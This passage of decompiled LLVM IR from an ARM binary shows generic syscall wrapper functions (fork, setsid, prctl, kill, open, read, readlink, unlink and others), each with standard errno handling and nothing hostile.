; uselistorder directives
  uselistorder i32 %v0_13574, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_13554, { 1, 0, 2 }
  uselistorder i32 %v7_1354c, { 1, 0 }
  uselistorder i32 %v3_13548, { 1, 0 }
  uselistorder i32 %v1_13530.v6_13530.v6_13538.v6_13540, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_1353c, { 1, 0 }
  uselistorder i32 %v4_13534, { 1, 0 }
  uselistorder i32 %v4_1352c, { 1, 0 }
  uselistorder i32 %v6_1354c, { 3, 0, 2, 1 }
  uselistorder i32 %v2_1351c, { 1, 0 }
  uselistorder i32 %v1_13510, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_1350c, { 1, 0, 3, 2 }
  uselistorder i32 %v4_134fc, { 1, 0, 3, 2 }
  uselistorder i32 %v0_13508.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_134dc, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_134e4, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 ()* @function_135a8, { 2, 1, 0 }
  uselistorder i32 268435455, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_13584, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_13578, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_13524, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @function_135a8() local_unnamed_addr {
dec_label_pc_135a8:
  %v1_135a8 = load i32, i32* @r0, align 4
  ret i32 %v1_135a8
}

define i32 @function_135ac(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_135ac:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_135ac = load i32, i32* @r2, align 4
  %v1_135bc = add i32 %arg2, -12
  store i32 %v6_135ac, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_135bc, 2
  br i1 %tmp, label %dec_label_pc_135e4, label %dec_label_pc_135dc

dec_label_pc_135dc:                               ; preds = %dec_label_pc_135ac
  %v0_135dc = call i32 @function_13620()
  br label %dec_label_pc_13610

dec_label_pc_135e4:                               ; preds = %dec_label_pc_135ac
  %v2_135ec = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_135ec, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_135ec, -4095
  br i1 %tmp8, label %dec_label_pc_13610, label %dec_label_pc_135fc

dec_label_pc_135fc:                               ; preds = %dec_label_pc_135e4
  %v0_135fc = call i32 @function_13c70()
  %v0_13600 = load i32, i32* %r4.global-to-local, align 4
  %v1_13600 = sub i32 0, %v0_13600
  %v2_13604 = inttoptr i32 %v0_135fc to i32*
  store i32 %v1_13600, i32* %v2_13604, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13610

dec_label_pc_13610:                               ; preds = %dec_label_pc_135fc, %dec_label_pc_135e4, %dec_label_pc_135dc
  %storemerge = phi i32 [ %v0_135dc, %dec_label_pc_135dc ], [ %v2_135ec, %dec_label_pc_135e4 ], [ -1, %dec_label_pc_135fc ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_135ec, { 1, 0, 2 }
}

define i32 @function_13620() local_unnamed_addr {
dec_label_pc_13620:
  %r4.global-to-local = alloca i32, align 4
  %v0_13640 = load i32, i32* @r0, align 4
  store i32 %v0_13640, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13640, -4095
  br i1 %tmp, label %dec_label_pc_1365c, label %dec_label_pc_1364c

dec_label_pc_1364c:                               ; preds = %dec_label_pc_13620
  %v0_1364c = call i32 @function_13c70()
  %v0_13650 = load i32, i32* %r4.global-to-local, align 4
  %v1_13650 = sub i32 0, %v0_13650
  %v2_13654 = inttoptr i32 %v0_1364c to i32*
  store i32 %v1_13650, i32* %v2_13654, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1365c

dec_label_pc_1365c:                               ; preds = %dec_label_pc_13620, %dec_label_pc_1364c
  %v0_1365c = phi i32 [ %v0_13640, %dec_label_pc_13620 ], [ -1, %dec_label_pc_1364c ]
  ret i32 %v0_1365c

; uselistorder directives
  uselistorder i32 %v0_13640, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1365c, { 1, 0 }
}

define i32 @function_13670(i8* %arg1) local_unnamed_addr {
dec_label_pc_13670:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13670 = load i32, i32* @r4, align 4
  store i32 %v3_13670, i32* %stack_var_-8, align 4
  %v3_13674 = call i32 @chdir(i8* %arg1)
  store i32 %v3_13674, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_13674, -4095
  br i1 %tmp, label %dec_label_pc_13694, label %dec_label_pc_13684

dec_label_pc_13684:                               ; preds = %dec_label_pc_13670
  %v0_13684 = call i32 @function_13c70()
  %v0_13688 = load i32, i32* %r4.global-to-local, align 4
  %v1_13688 = sub i32 0, %v0_13688
  %v2_1368c = inttoptr i32 %v0_13684 to i32*
  store i32 %v1_13688, i32* %v2_1368c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13694

dec_label_pc_13694:                               ; preds = %dec_label_pc_13670, %dec_label_pc_13684
  %v0_13694 = phi i32 [ %v3_13674, %dec_label_pc_13670 ], [ -1, %dec_label_pc_13684 ]
  %v2_13698 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13698, i32* @r4, align 4
  ret i32 %v0_13694

; uselistorder directives
  uselistorder i32 %v3_13674, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13694, { 1, 0 }
}

define i32 @function_1369c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1369c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1369c = load i32, i32* @r4, align 4
  store i32 %v3_1369c, i32* %stack_var_-8, align 4
  %v1_136a0 = call i32 @close(i32 %arg1)
  store i32 %v1_136a0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_136a0, -4095
  br i1 %tmp, label %dec_label_pc_136c0, label %dec_label_pc_136b0

dec_label_pc_136b0:                               ; preds = %dec_label_pc_1369c
  %v0_136b0 = call i32 @function_13c70()
  %v0_136b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_136b4 = sub i32 0, %v0_136b4
  %v2_136b8 = inttoptr i32 %v0_136b0 to i32*
  store i32 %v1_136b4, i32* %v2_136b8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_136c0

dec_label_pc_136c0:                               ; preds = %dec_label_pc_1369c, %dec_label_pc_136b0
  %v0_136c0 = phi i32 [ %v1_136a0, %dec_label_pc_1369c ], [ -1, %dec_label_pc_136b0 ]
  %v2_136c4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_136c4, i32* @r4, align 4
  ret i32 %v0_136c0

; uselistorder directives
  uselistorder i32 %v1_136a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_136c0, { 1, 0 }
}

define i32 @function_136c8() local_unnamed_addr {
dec_label_pc_136c8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_136c8 = load i32, i32* @r4, align 4
  store i32 %v3_136c8, i32* %stack_var_-8, align 4
  %v0_136cc = call i32 @fork()
  store i32 %v0_136cc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_136cc, -4095
  br i1 %tmp, label %dec_label_pc_136ec, label %dec_label_pc_136dc

dec_label_pc_136dc:                               ; preds = %dec_label_pc_136c8
  %v0_136dc = call i32 @function_13c70()
  %v0_136e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_136e0 = sub i32 0, %v0_136e0
  %v2_136e4 = inttoptr i32 %v0_136dc to i32*
  store i32 %v1_136e0, i32* %v2_136e4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_136ec

dec_label_pc_136ec:                               ; preds = %dec_label_pc_136c8, %dec_label_pc_136dc
  %v0_136ec = phi i32 [ %v0_136cc, %dec_label_pc_136c8 ], [ -1, %dec_label_pc_136dc ]
  %v2_136f0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_136f0, i32* @r4, align 4
  ret i32 %v0_136ec

; uselistorder directives
  uselistorder i32 %v0_136cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_136ec, { 1, 0 }
}

define i32 @function_136f4() local_unnamed_addr {
dec_label_pc_136f4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_136f4 = load i32, i32* @r4, align 4
  store i32 %v3_136f4, i32* %stack_var_-8, align 4
  %v0_136f8 = call i32 @getpid()
  store i32 %v0_136f8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_136f8, -4095
  br i1 %tmp, label %dec_label_pc_13718, label %dec_label_pc_13708

dec_label_pc_13708:                               ; preds = %dec_label_pc_136f4
  %v0_13708 = call i32 @function_13c70()
  %v0_1370c = load i32, i32* %r4.global-to-local, align 4
  %v1_1370c = sub i32 0, %v0_1370c
  %v2_13710 = inttoptr i32 %v0_13708 to i32*
  store i32 %v1_1370c, i32* %v2_13710, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13718

dec_label_pc_13718:                               ; preds = %dec_label_pc_136f4, %dec_label_pc_13708
  %v0_13718 = phi i32 [ %v0_136f8, %dec_label_pc_136f4 ], [ -1, %dec_label_pc_13708 ]
  %v2_1371c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1371c, i32* @r4, align 4
  ret i32 %v0_13718

; uselistorder directives
  uselistorder i32 %v0_136f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13718, { 1, 0 }
}

define i32 @function_13720() local_unnamed_addr {
dec_label_pc_13720:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13720 = load i32, i32* @r4, align 4
  store i32 %v3_13720, i32* %stack_var_-8, align 4
  %v0_13724 = call i32 @getppid()
  store i32 %v0_13724, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13724, -4095
  br i1 %tmp, label %dec_label_pc_13744, label %dec_label_pc_13734

dec_label_pc_13734:                               ; preds = %dec_label_pc_13720
  %v0_13734 = call i32 @function_13c70()
  %v0_13738 = load i32, i32* %r4.global-to-local, align 4
  %v1_13738 = sub i32 0, %v0_13738
  %v2_1373c = inttoptr i32 %v0_13734 to i32*
  store i32 %v1_13738, i32* %v2_1373c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13744

dec_label_pc_13744:                               ; preds = %dec_label_pc_13720, %dec_label_pc_13734
  %v0_13744 = phi i32 [ %v0_13724, %dec_label_pc_13720 ], [ -1, %dec_label_pc_13734 ]
  %v2_13748 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13748, i32* @r4, align 4
  ret i32 %v0_13744

; uselistorder directives
  uselistorder i32 %v0_13724, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13744, { 1, 0 }
}

define i32 @function_1374c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1374c:
  %r4.global-to-local = alloca i32, align 4
  %v2_13768 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_13768, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_13768, -4095
  br i1 %tmp, label %dec_label_pc_13788, label %dec_label_pc_13778

dec_label_pc_13778:                               ; preds = %dec_label_pc_1374c
  %v0_13778 = call i32 @function_13c70()
  %v0_1377c = load i32, i32* %r4.global-to-local, align 4
  %v1_1377c = sub i32 0, %v0_1377c
  %v2_13780 = inttoptr i32 %v0_13778 to i32*
  store i32 %v1_1377c, i32* %v2_13780, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13788

dec_label_pc_13788:                               ; preds = %dec_label_pc_1374c, %dec_label_pc_13778
  %v0_13788 = phi i32 [ %v2_13768, %dec_label_pc_1374c ], [ -1, %dec_label_pc_13778 ]
  ret i32 %v0_13788

; uselistorder directives
  uselistorder i32 %v2_13768, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13788, { 1, 0 }
}

define i32 @function_1379c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1379c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1379c = load i32, i32* @r4, align 4
  store i32 %v3_1379c, i32* %stack_var_-8, align 4
  %v2_137a0 = call i32 @kill(i32 %arg1, i32 %arg2)
  %v7_137a4 = icmp eq i32 %v2_137a0, -4096
  store i1 %v7_137a4, i1* @cpsr_z, align 1
  store i32 %v2_137a0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_137a0, -4095
  br i1 %tmp, label %dec_label_pc_137c0, label %dec_label_pc_137b0

dec_label_pc_137b0:                               ; preds = %dec_label_pc_1379c
  %v0_137b0 = call i32 @function_13c70()
  %v0_137b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_137b4 = sub i32 0, %v0_137b4
  %v2_137b8 = inttoptr i32 %v0_137b0 to i32*
  store i32 %v1_137b4, i32* %v2_137b8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_137c0

dec_label_pc_137c0:                               ; preds = %dec_label_pc_1379c, %dec_label_pc_137b0
  %v0_137c0 = phi i32 [ %v2_137a0, %dec_label_pc_1379c ], [ -1, %dec_label_pc_137b0 ]
  %v2_137c4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_137c4, i32* @r4, align 4
  ret i32 %v0_137c0

; uselistorder directives
  uselistorder i32 %v2_137a0, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_137c0, { 1, 0 }
}

define i32 @function_137c8(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_137c8:
  %r4.global-to-local = alloca i32, align 4
  %v1_137d8 = and i32 %arg2, 64
  %v2_137d8 = icmp eq i32 %v1_137d8, 0
  br i1 %v2_137d8, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_137c8
  %v6_137c8 = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_137c8, 65536
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_137c8, %bb
  %v0_137e8 = phi i32 [ 0, %dec_label_pc_137c8 ], [ %phitmp, %bb ]
  store i32 %v0_137e8, i32* @r2, align 4
  %v4_137f0 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_137f4 = icmp eq i32 %v4_137f0, -4096
  store i1 %v7_137f4, i1* @cpsr_z, align 1
  store i32 %v4_137f0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_137f0, -4095
  br i1 %tmp, label %dec_label_pc_13810, label %dec_label_pc_13800

dec_label_pc_13800:                               ; preds = %.thread1
  %v0_13800 = call i32 @function_13c70()
  %v0_13804 = load i32, i32* %r4.global-to-local, align 4
  %v1_13804 = sub i32 0, %v0_13804
  %v2_13808 = inttoptr i32 %v0_13800 to i32*
  store i32 %v1_13804, i32* %v2_13808, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13810

dec_label_pc_13810:                               ; preds = %.thread1, %dec_label_pc_13800
  %v0_13810 = phi i32 [ %v4_137f0, %.thread1 ], [ -1, %dec_label_pc_13800 ]
  ret i32 %v0_13810

; uselistorder directives
  uselistorder i32 %v4_137f0, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_13810, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_13824(i32 %arg1) local_unnamed_addr {
dec_label_pc_13824:
  store i32 %arg1, i32* @r2, align 4
  %v0_1382c = load i32, i32* @r0, align 4
  %v2_1382c = inttoptr i32 %v0_1382c to i8*
  %v3_1382c = call i32 @function_137c8(i8* %v2_1382c, i32 577)
  %v0_13830 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13830, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_13824
  %v6_13830 = and i32 %v3_1382c, 36
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_13824, %bb
  %v7_13830 = phi i32 [ %v3_1382c, %dec_label_pc_13824 ], [ %v6_13830, %bb ]
  ret i32 %v7_13830

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_13834(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13834:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13834 = load i32, i32* @r4, align 4
  store i32 %v3_13834, i32* %stack_var_-8, align 4
  %v4_1383c = call i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 0)
  store i32 %v4_1383c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_1383c, -4095
  br i1 %tmp, label %dec_label_pc_1385c, label %dec_label_pc_1384c

dec_label_pc_1384c:                               ; preds = %dec_label_pc_13834
  %v0_1384c = call i32 @function_13c70()
  %v0_13850 = load i32, i32* %r4.global-to-local, align 4
  %v1_13850 = sub i32 0, %v0_13850
  %v2_13854 = inttoptr i32 %v0_1384c to i32*
  store i32 %v1_13850, i32* %v2_13854, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1385c

dec_label_pc_1385c:                               ; preds = %dec_label_pc_13834, %dec_label_pc_1384c
  %v0_1385c = phi i32 [ %v4_1383c, %dec_label_pc_13834 ], [ -1, %dec_label_pc_1384c ]
  %v2_13860 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13860, i32* @r4, align 4
  ret i32 %v0_1385c

; uselistorder directives
  uselistorder i32 %v4_1383c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1385c, { 1, 0 }
}

define i32 @function_13864(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13864:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13864 = load i32, i32* @r4, align 4
  store i32 %v3_13864, i32* %stack_var_-8, align 4
  %v4_13868 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_13868, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_13868, -4095
  br i1 %tmp, label %dec_label_pc_13888, label %dec_label_pc_13878

dec_label_pc_13878:                               ; preds = %dec_label_pc_13864
  %v0_13878 = call i32 @function_13c70()
  %v0_1387c = load i32, i32* %r4.global-to-local, align 4
  %v1_1387c = sub i32 0, %v0_1387c
  %v2_13880 = inttoptr i32 %v0_13878 to i32*
  store i32 %v1_1387c, i32* %v2_13880, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13888

dec_label_pc_13888:                               ; preds = %dec_label_pc_13864, %dec_label_pc_13878
  %v0_13888 = phi i32 [ %v4_13868, %dec_label_pc_13864 ], [ -1, %dec_label_pc_13878 ]
  %v2_1388c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1388c, i32* @r4, align 4
  ret i32 %v0_13888

; uselistorder directives
  uselistorder i32 %v4_13868, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13888, { 1, 0 }
}

define i32 @function_13890(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13890:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v3_13890 = load i32, i32* @r4, align 4
  store i32 %v3_13890, i32* %stack_var_-8, align 4
  %v7_13894 = call i32 @readlink(i8* %arg1, i8* %tmp, i32 %arg3)
  store i32 %v7_13894, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v7_13894, -4095
  br i1 %tmp6, label %dec_label_pc_138b4, label %dec_label_pc_138a4

dec_label_pc_138a4:                               ; preds = %dec_label_pc_13890
  %v0_138a4 = call i32 @function_13c70()
  %v0_138a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_138a8 = sub i32 0, %v0_138a8
  %v2_138ac = inttoptr i32 %v0_138a4 to i32*
  store i32 %v1_138a8, i32* %v2_138ac, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_138b4

dec_label_pc_138b4:                               ; preds = %dec_label_pc_13890, %dec_label_pc_138a4
  %v0_138b4 = phi i32 [ %v7_13894, %dec_label_pc_13890 ], [ -1, %dec_label_pc_138a4 ]
  %v2_138b8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_138b8, i32* @r4, align 4
  ret i32 %v0_138b4

; uselistorder directives
  uselistorder i32 %v7_13894, { 1, 0, 2 }
  uselistorder label %dec_label_pc_138b4, { 1, 0 }
}

define i32 @function_138bc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_138bc:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_138bc = load i32, i32* @r4, align 4
  store i32 %v3_138bc, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_138e4, label %dec_label_pc_138d4

dec_label_pc_138d4:                               ; preds = %dec_label_pc_138bc
  %v0_138d4 = call i32 @function_13c70()
  %v0_138d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_138d8 = sub i32 0, %v0_138d8
  %v2_138dc = inttoptr i32 %v0_138d4 to i32*
  store i32 %v1_138d8, i32* %v2_138dc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_138e8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_138e4

dec_label_pc_138e4:                               ; preds = %dec_label_pc_138bc, %dec_label_pc_138d4
  %v2_138e8 = phi i32 [ %v3_138bc, %dec_label_pc_138bc ], [ %v2_138e8.pre, %dec_label_pc_138d4 ]
  %v0_138e4 = phi i32 [ %arg1, %dec_label_pc_138bc ], [ -1, %dec_label_pc_138d4 ]
  store i32 %v2_138e8, i32* @r4, align 4
  ret i32 %v0_138e4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_138e4, { 1, 0 }
}

define i32 @function_138ec(i32 %arg1) local_unnamed_addr {
dec_label_pc_138ec:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_138ec = load i32, i32* @r4, align 4
  store i32 %v3_138ec, i32* %stack_var_-8, align 4
  %v0_138f0 = call i32 @setsid()
  store i32 %v0_138f0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_138f0, -4095
  br i1 %tmp, label %dec_label_pc_13910, label %dec_label_pc_13900

dec_label_pc_13900:                               ; preds = %dec_label_pc_138ec
  %v0_13900 = call i32 @function_13c70()
  %v0_13904 = load i32, i32* %r4.global-to-local, align 4
  %v1_13904 = sub i32 0, %v0_13904
  %v2_13908 = inttoptr i32 %v0_13900 to i32*
  store i32 %v1_13904, i32* %v2_13908, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13910

dec_label_pc_13910:                               ; preds = %dec_label_pc_138ec, %dec_label_pc_13900
  %v0_13910 = phi i32 [ %v0_138f0, %dec_label_pc_138ec ], [ -1, %dec_label_pc_13900 ]
  %v2_13914 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13914, i32* @r4, align 4
  ret i32 %v0_13910

; uselistorder directives
  uselistorder i32 %v0_138f0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13910, { 1, 0 }
}

define i32 @function_13918(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13918:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13918 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_13918, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_13918
  %v3_139205 = load i32, i32* @r4, align 4
  store i32 %v3_139205, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13940

bb:                                               ; preds = %dec_label_pc_13918
  %v3_13920 = load i32, i32* @r4, align 4
  store i32 %v3_13920, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_13940, label %dec_label_pc_1392c

dec_label_pc_1392c:                               ; preds = %bb
  %v0_1392c = call i32 @function_13c70()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_13938 = inttoptr i32 %v0_1392c to i32*
  store i32 22, i32* %v2_13938, align 4
  %v0_13964.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13964

dec_label_pc_13940:                               ; preds = %.thread, %bb
  %v7_13940 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_13940, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_13940, -4095
  br i1 %tmp13, label %dec_label_pc_13960, label %dec_label_pc_13950

dec_label_pc_13950:                               ; preds = %dec_label_pc_13940
  %v0_13950 = call i32 @function_13c70()
  %v0_13954 = load i32, i32* %r4.global-to-local, align 4
  %v1_13954 = sub i32 0, %v0_13954
  %v2_13958 = inttoptr i32 %v0_13950 to i32*
  store i32 %v1_13954, i32* %v2_13958, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13960

dec_label_pc_13960:                               ; preds = %dec_label_pc_13940, %dec_label_pc_13950
  %v0_13960 = phi i32 [ %v7_13940, %dec_label_pc_13940 ], [ -1, %dec_label_pc_13950 ]
  store i32 %v0_13960, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13964

dec_label_pc_13964:                               ; preds = %dec_label_pc_1392c, %dec_label_pc_13960
  %v0_13964 = phi i32 [ %v0_13964.pre, %dec_label_pc_1392c ], [ %v0_13960, %dec_label_pc_13960 ]
  %v2_13968 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13968, i32* @r4, align 4
  ret i32 %v0_13964

; uselistorder directives
  uselistorder i32 %v7_13940, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_13964, { 1, 0 }
  uselistorder label %dec_label_pc_13960, { 1, 0 }
  uselistorder label %dec_label_pc_13940, { 1, 0 }
}

define i32 @function_1396c(i32* %arg1) local_unnamed_addr {
dec_label_pc_1396c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1396c = load i32, i32* @r4, align 4
  store i32 %v3_1396c, i32* %stack_var_-8, align 4
  %v2_13970 = call i32 @time(i32* %arg1)
  store i32 %v2_13970, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_13970, -4095
  br i1 %tmp, label %dec_label_pc_13990, label %dec_label_pc_13980

dec_label_pc_13980:                               ; preds = %dec_label_pc_1396c
  %v0_13980 = call i32 @function_13c70()
  %v0_13984 = load i32, i32* %r4.global-to-local, align 4
  %v1_13984 = sub i32 0, %v0_13984
  %v2_13988 = inttoptr i32 %v0_13980 to i32*
  store i32 %v1_13984, i32* %v2_13988, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13990

dec_label_pc_13990:                               ; preds = %dec_label_pc_1396c, %dec_label_pc_13980
  %v0_13990 = phi i32 [ %v2_13970, %dec_label_pc_1396c ], [ -1, %dec_label_pc_13980 ]
  %v2_13994 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13994, i32* @r4, align 4
  ret i32 %v0_13990

; uselistorder directives
  uselistorder i32 %v2_13970, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13990, { 1, 0 }
}

define i32 @function_13998(i8* %arg1) local_unnamed_addr {
dec_label_pc_13998:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13998 = load i32, i32* @r4, align 4
  store i32 %v3_13998, i32* %stack_var_-8, align 4
  %v3_1399c = call i32 @unlink(i8* %arg1)
  store i32 %v3_1399c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_1399c, -4095
  br i1 %tmp, label %dec_label_pc_139bc, label %dec_label_pc_139ac

dec_label_pc_139ac:                               ; preds = %dec_label_pc_13998
  %v0_139ac = call i32 @function_13c70()
  %v0_139b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_139b0 = sub i32 0, %v0_139b0
  %v2_139b4 = inttoptr i32 %v0_139ac to i32*
  store i32 %v1_139b0, i32* %v2_139b4, align 4
